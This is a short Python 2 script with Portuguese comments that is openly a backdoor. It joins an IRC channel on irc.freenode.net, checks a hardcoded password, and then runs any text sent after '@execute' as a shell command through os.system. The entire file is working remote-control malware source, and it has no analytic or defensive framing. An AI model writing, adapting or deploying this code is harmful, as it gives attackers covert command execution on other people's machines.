#! /usr/bin/python
#coding: utf-8
import socket
from re import search
import sys,os
import random
import time
class bot:
    def __init__(self, Server, Canal, Porta, Nick, Senha):
        self.Server = None
        self.Canal = None
        self.Nick = None
        self.Senha = None
        self.Porta = None
        #cria o socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conectar(Server, Porta,Nick,Canal)
    def conectar(self, Server, Porta,Nick, canal):
        #radomiza o backdoor
        complemento = str(random.randint(0,100000))
        complemento += random.choice("abcdefghijklmnopqrstuvwxyz012345678910")
        Nick += complemento
        #conecta no IRC
        self.sock.connect((Server,Porta))
        print self.sock.recv(1024)
        self.sock.send("NICK %s\r\n" % Nick)
        print self.sock.recv(1024)
        #regista usuario
        self.sock.send("USER "+ Nick +" "+ Nick +" "+ Nick +" :.\n")
        print self.sock.recv(1024)
        #entra no canal
        self.sock.send("join %s\r\n" % canal)
        time.sleep(2)
        print self.sock.recv(1024)
        verificar = False
        # vefifica a senha
        while verificar != True:
            msg = self.sock.recv(5000)
            print msg
            if msg[0:4] == "PING":
                      self.sock.send(msg.replace("PING", "PONG"))
            # s贸 loga se a senha correta
            if search("@teste %s" % Senha, msg):
                self.sock.send("PRIVMSG %s : --> Conectado com sucesso! \r\n" % str(canal))
                verificar = True
        while (1):
            # tratamento
            msg = self.sock.recv(5000)
            print msg
            if msg[0:4] == "PING":
                self.sock.send(msg.replace("PING", "PONG"))
            #executa comando!
            if search("@execute", msg):
                msg = msg.split("@execute")
                msg = msg[1].split("\r\n")
                os.system(msg[0])
                self.sock.send("PRIVMSG %s : comando executado OK \r\n" % canal)
#------------------------------------- variaveis do server   -----------------------------
Server = "irc.freenode.net"
Channel = "#nesster"
Porta = 6667
Nick = "Backdoor"
Senha = "123456"
 
server = bot(Server,Channel,Porta,Nick,Senha)